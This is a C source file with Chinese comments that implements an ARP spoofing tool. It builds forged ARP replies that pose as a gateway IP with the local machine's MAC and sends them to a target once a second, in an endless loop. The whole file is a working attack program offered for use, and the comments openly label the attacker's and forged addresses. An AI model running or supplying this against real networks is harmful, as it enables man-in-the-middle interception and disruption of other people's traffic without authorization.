/**
 * @file arp_spoof.c
 * @brief 发送伪造的ARP响应包，实现ARP欺骗
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <net/ethernet.h>
#include <net/if_arp.h>
#include <net/if.h>
#include <netpacket/packet.h>

#define ETHER_HEADER_LEN sizeof(struct ether_header)
#define ETHER_ARP_LEN sizeof(struct ether_arp)
#define ETHER_ARP_PACKET_LEN ETHER_HEADER_LEN + ETHER_ARP_LEN
#define IP_ADDR_LEN 4
#define BROADCAST_ADDR {0xff, 0xff, 0xff, 0xff, 0xff, 0xff}

void err_exit(const char *err_msg) {
    perror(err_msg);
    exit(1);
}

/* 填充ARP欺骗响应包 */
struct ether_arp *fill_arp_reply_packet(const unsigned char *src_mac_addr, const char *src_ip, const unsigned char *target_mac, const char *target_ip) {
    struct ether_arp *arp_packet;
    struct in_addr src_in_addr, dst_in_addr;

    // 将字符串格式的IP地址转换为二进制格式
    inet_pton(AF_INET, src_ip, &src_in_addr);  // 源IP（伪装为网关IP）
    inet_pton(AF_INET, target_ip, &dst_in_addr);  // 目标IP

    arp_packet = (struct ether_arp *)malloc(ETHER_ARP_LEN);
    arp_packet->arp_hrd = htons(ARPHRD_ETHER);   // 硬件类型：以太网
    arp_packet->arp_pro = htons(ETHERTYPE_IP);   // 协议类型：IPv4
    arp_packet->arp_hln = ETH_ALEN;              // 硬件地址长度
    arp_packet->arp_pln = IP_ADDR_LEN;           // 协议地址长度
    arp_packet->arp_op = htons(ARPOP_REPLY);     // 设置为ARP响应

    // 设置ARP包的源MAC和IP（伪装为网关）
    memcpy(arp_packet->arp_sha, src_mac_addr, ETH_ALEN);  // 攻击者的MAC地址
    memcpy(arp_packet->arp_spa, &src_in_addr, IP_ADDR_LEN);  // 伪造的网关IP

    // 设置ARP包的目标MAC和IP（目标主机）
    memcpy(arp_packet->arp_tha, target_mac, ETH_ALEN);  // 目标主机的MAC地址
    memcpy(arp_packet->arp_tpa, &dst_in_addr, IP_ADDR_LEN);  // 目标主机的IP地址

    return arp_packet;
}

/* 发送ARP欺骗包 */
void arp_spoof(const char *if_name, const char *target_ip, const char *spoof_ip) {
    struct sockaddr_ll saddr_ll;
    struct ether_header *eth_header;
    struct ether_arp *arp_packet;
    struct ifreq ifr;
    char buf[ETHER_ARP_PACKET_LEN];
    unsigned char src_mac_addr[ETH_ALEN];
    unsigned char target_mac_addr[ETH_ALEN] = BROADCAST_ADDR;
    char *src_ip;
    int sock_raw_fd, ret_len, i;

    // 创建原始套接字
    if ((sock_raw_fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1)
        err_exit("socket()");

    bzero(&saddr_ll, sizeof(struct sockaddr_ll));
    bzero(&ifr, sizeof(struct ifreq));
    memcpy(ifr.ifr_name, if_name, strlen(if_name));

    // 获取网卡接口索引
    if (ioctl(sock_raw_fd, SIOCGIFINDEX, &ifr) == -1)
        err_exit("ioctl() get ifindex");
    saddr_ll.sll_ifindex = ifr.ifr_ifindex;
    saddr_ll.sll_family = PF_PACKET;

    // 获取本机MAC地址
    if (ioctl(sock_raw_fd, SIOCGIFHWADDR, &ifr))
        err_exit("ioctl() get mac");
    memcpy(src_mac_addr, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
    printf("local mac");
    for (i = 0; i < ETH_ALEN; i++)
        printf(":%02x", src_mac_addr[i]);
    printf("\n");

    bzero(buf, ETHER_ARP_PACKET_LEN);

    // 填充以太网帧头部
    eth_header = (struct ether_header *)buf;
    memcpy(eth_header->ether_shost, src_mac_addr, ETH_ALEN);  // 攻击者MAC地址
    memcpy(eth_header->ether_dhost, target_mac_addr, ETH_ALEN);  // 广播地址或目标MAC地址
    eth_header->ether_type = htons(ETHERTYPE_ARP);

    // 填充ARP包
    arp_packet = fill_arp_reply_packet(src_mac_addr, spoof_ip, target_mac_addr, target_ip);
    memcpy(buf + ETHER_HEADER_LEN, arp_packet, ETHER_ARP_LEN);

    // 循环发送ARP欺骗包
    while(1) {
        ret_len = sendto(sock_raw_fd, buf, ETHER_ARP_PACKET_LEN, 0, (struct sockaddr *)&saddr_ll, sizeof(struct sockaddr_ll));
        if (ret_len > 0)
            printf("ARP spoof packet sent to %s as %s\n", target_ip, spoof_ip);
        sleep(1);  // 每秒发送一次ARP欺骗包，持续更新目标ARP表
    }

    close(sock_raw_fd);
    free(arp_packet);
}

int main(int argc, const char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <interface> <target_ip> <spoof_ip>\n", argv[0]);
        exit(1);
    }

    arp_spoof(argv[1], argv[2], argv[3]);

    return 0;
}

